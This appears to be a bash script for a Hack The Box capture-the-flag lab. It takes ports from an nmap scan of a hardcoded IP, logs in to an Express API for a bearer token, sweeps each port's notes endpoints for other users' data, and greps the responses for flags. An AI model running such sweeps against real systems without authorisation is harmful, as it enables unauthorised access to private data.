#!/usr/bin/env bash
set -euo pipefail
IP=${1:-94.237.49.23}
NMAP_FILE=${2:-/workspace/recon/nmap/tcp_full.nmap}
TO=8
OUT_DIR=/workspace/recon/httpx
TMP_DIR=/workspace/recon/tmp
API_BASE="http://$IP:41412"
mkdir -p "$OUT_DIR" "$TMP_DIR"
# Build list of Node.js Express ports
NODE_PORTS=$(grep -E "^[0-9]+/tcp\s+open\s+http\s+Node\.js Express framework" "$NMAP_FILE" | cut -d/ -f1 | tr '\n' ' ')
NODE_PORTS="$NODE_PORTS 41412 41417 46132 48544 48656 50692 52548 54991 57280 57759"
echo "$NODE_PORTS" | tr ' ' '\n' | sort -n | uniq > "$TMP_DIR/node_ports_all.txt"
# Get token
curl -fsS -m 8 --connect-timeout 8 -H 'Content-Type: application/json' -d '{"email":"a@a.com","password":"a"}' "$API_BASE/api/auth/login" > "$OUT_DIR/login_resp.json"
TOKEN=$(jq -r .token "$OUT_DIR/login_resp.json")
echo "$TOKEN" > "$TMP_DIR/token.txt"
# Sweep each port for /api/notes/all
: > "$OUT_DIR/api_all_sweep_hits.txt"
while read -r p; do
  [ -z "$p" ] && continue
  URL="http://$IP:$p/api/notes/all"
  echo "PORT $p GET $URL" | tee -a "$OUT_DIR/api_all_sweep.log"
  RES=$(curl -fsS -m "$TO" --connect-timeout "$TO" -H "Authorization: Bearer $TOKEN" "$URL" 2>/dev/null || true)
  echo "$RES" > "$OUT_DIR/api_all_${p}.json"
  echo "$RES" | rg -n "HTB\{[^}]+\}" -S >> "$OUT_DIR/api_all_sweep_hits.txt" || true
  sleep 0.2
done < "$TMP_DIR/node_ports_all.txt"
# Also sweep /api/notes (list)
while read -r p; do
  [ -z "$p" ] && continue
  URL="http://$IP:$p/api/notes"
  RES=$(curl -fsS -m "$TO" --connect-timeout "$TO" -H "Authorization: Bearer $TOKEN" "$URL" 2>/dev/null || true)
  echo "$RES" > "$OUT_DIR/api_notes_${p}.json"
  echo "$RES" | rg -n "HTB\{[^}]+\}" -S >> "$OUT_DIR/api_all_sweep_hits.txt" || true
  sleep 0.2
done < "$TMP_DIR/node_ports_all.txt"
# Print hits
sed -n '1,200p' "$OUT_DIR/api_all_sweep_hits.txt" || true
